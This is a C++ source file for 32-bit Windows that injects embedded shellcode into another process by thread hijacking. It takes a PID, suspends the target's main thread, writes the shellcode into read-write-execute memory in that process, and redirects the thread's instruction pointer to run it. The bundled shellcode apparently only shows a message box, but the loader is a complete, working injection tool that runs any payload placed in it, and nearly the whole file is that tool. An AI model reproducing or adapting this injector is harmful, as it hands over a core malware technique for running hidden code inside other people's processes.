
#include <iostream>
#include <Windows.h>

// MessageBox X86 shellcode
char shellcode[] = "\x31\xdb\xb3\x30\x29\xdc\x64\x8b\x03\x8b\x40\x0c\x8b"
"\x58\x1c\x8b\x1b\x8b\x1b\x8b\x73\x08\x89\xf7\x89\x3c"
"\x24\x8b\x47\x3c\x01\xc7\x31\xdb\xb3\x78\x01\xdf\x8b"
"\x3f\x8b\x04\x24\x01\xf8\x89\x44\x24\x08\x31\xdb\xb3"
"\x1c\x01\xc3\x8b\x03\x8b\x3c\x24\x01\xf8\x89\x44\x24"
"\x0c\x8b\x44\x24\x08\x31\xdb\xb3\x20\x01\xc3\x8b\x03"
"\x01\xf8\x89\x44\x24\x10\x8b\x44\x24\x08\x31\xdb\xb3"
"\x24\x01\xc3\x8b\x03\x01\xf8\x89\x44\x24\x14\x8b\x44"
"\x24\x08\x31\xdb\xb3\x18\x01\xc3\x8b\x03\x89\x44\x24"
"\x18\x8b\x74\x24\x30\x31\xf6\x89\x74\x24\x30\x8b\x4c"
"\x24\x18\x8b\x2c\x24\x8b\x5c\x24\x10\x8b\x4c\x24\x18"
"\x85\xc9\x74\x5f\x49\x89\x4c\x24\x18\x8b\x34\x8b\x01"
"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf"
"\x0d\x01\xc7\xeb\xf4\x8b\x5c\x24\x14\x66\x8b\x0c\x4b"
"\x8b\x5c\x24\x0c\x8b\x04\x8b\x01\xe8\x8b\x34\x24\x81"
"\xff\xaa\xfc\x0d\x7c\x75\x08\x8d\x74\x24\x20\x89\x06"
"\xeb\xb5\x81\xff\x8e\x4e\x0e\xec\x75\x08\x8d\x74\x24"
"\x24\x89\x06\xeb\xa5\x81\xff\x7e\xd8\xe2\x73\x75\x9d"
"\x8d\x74\x24\x1c\x89\x06\xeb\x95\x89\xe6\x31\xd2\x66"
"\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x75\x73\x65"
"\x72\x54\xff\x56\x24\x89\x46\x28\x31\xd2\xb2\x41\x52"
"\x31\xd2\x66\xba\x6f\x78\x66\x52\x68\x61\x67\x65\x42"
"\x68\x4d\x65\x73\x73\x54\x50\xff\x56\x20\x89\x46\x2c"
"\x31\xd2\xb2\x20\x52\x31\xd2\x66\xba\x74\x6f\x66\x52"
"\x68\x69\x79\x61\x6e\x68\x46\x65\x62\x72\x89\xe3\x31"
"\xd2\xb2\x6f\x52\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2"
"\xb2\x04\x52\x31\xd2\x51\x53\x31\xff\x57\xff\x56\x2c"
"\x89\xf4\x57\xff\x54\x24\x20";


DWORD getMainTIDByPID(DWORD PID) {
    typedef struct tagTHREADENTRY32 {
        DWORD dwSize;
        DWORD cntUsage;
        DWORD th32ThreadID;
        DWORD th32OwnerProcessID;
        LONG  tpBasePri;
        LONG  tpDeltaPri;
        DWORD dwFlags;
    } THREADENTRY32;
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    using prot = HANDLE(WINAPI*)(DWORD dwFlags, DWORD th32ProcessID);
    prot CreateToolhelp32Snapshot = (prot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
    using prot2 = BOOL(WINAPI*)(HANDLE hSnapshot, THREADENTRY32* lpte);
    prot2 Thread32First = (prot2)GetProcAddress(kernel32, "Thread32First");
    using prot3 = BOOL(WINAPI*)(HANDLE hSnapshot, THREADENTRY32* lpte);
    prot3 Thread32Next = (prot3)GetProcAddress(kernel32, "Thread32Next");

    const std::tr1::shared_ptr<void> hThreadSnapshot(
        CreateToolhelp32Snapshot(0x00000004, 0), CloseHandle);
    if (hThreadSnapshot.get() == INVALID_HANDLE_VALUE) {
        throw std::runtime_error("GetMainThreadId failed");
    }
    THREADENTRY32 tEntry;
    tEntry.dwSize = sizeof(THREADENTRY32);
    DWORD result = 0;
    for (BOOL success = Thread32First(hThreadSnapshot.get(), &tEntry);
        !result && success && GetLastError() != ERROR_NO_MORE_FILES;
        success = Thread32Next(hThreadSnapshot.get(), &tEntry))
    {
        if (tEntry.th32OwnerProcessID == PID) {
            result = tEntry.th32ThreadID;
        }
    }
    return result;
}

void ShellLoader(DWORD PID) {
    std::cout << "getting TID...";
    DWORD dwThreadId = getMainTIDByPID(PID);
    std::cout << " succeffly\nTID: " << dwThreadId << "\n";
    std::cout << "Open process...";
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, PID);
    std::cout << " succeffly\n";
    std::cout << "Open thread...";
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, dwThreadId);
    std::cout << " succeffly\n";
    CONTEXT* CTX = (PCONTEXT)VirtualAlloc(0, sizeof(PCONTEXT), MEM_COMMIT, PAGE_READWRITE);
    CTX->ContextFlags = CONTEXT_FULL;
    std::cout << "Suspending thread...";
    SuspendThread(hThread);
    std::cout << " succeffly\n";
    std::cout << "Getting EIP value...";
    GetThreadContext(hThread, (PCONTEXT)CTX);
    std::cout << "succeffly\nEIP: " << CTX->Eip << "\n";
    std::cout << "Allocateing memory with RWX protect...";
    void* exAdr = VirtualAllocEx(hProcess, 0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    std::cout << " succeffly\nAddress: " << exAdr << "\n";
    std::cout << "Writting shellcode to " << exAdr << "...";
    WriteProcessMemory(hProcess, exAdr, shellcode, sizeof shellcode, 0);
    std::cout << "succeffly\n";
    std::cout << "Changing EIP to " << exAdr << "...";
    CTX->Eip = (DWORD)exAdr;
    SetThreadContext(hThread, (PCONTEXT)CTX);
    std::cout << "succeffly\n";
    std::cout << "Injection was ended. Resuming thread...";
    ResumeThread(hThread);
    std::cout << "\n";
    getchar();
}

int main()
{
    std::cout << "PID: ";
    char* cPID = new char[256];
    std::cin >> cPID;
    std::cout << "\n";
    DWORD dwPID = atoi(cPID);
    ShellLoader(dwPID);
}
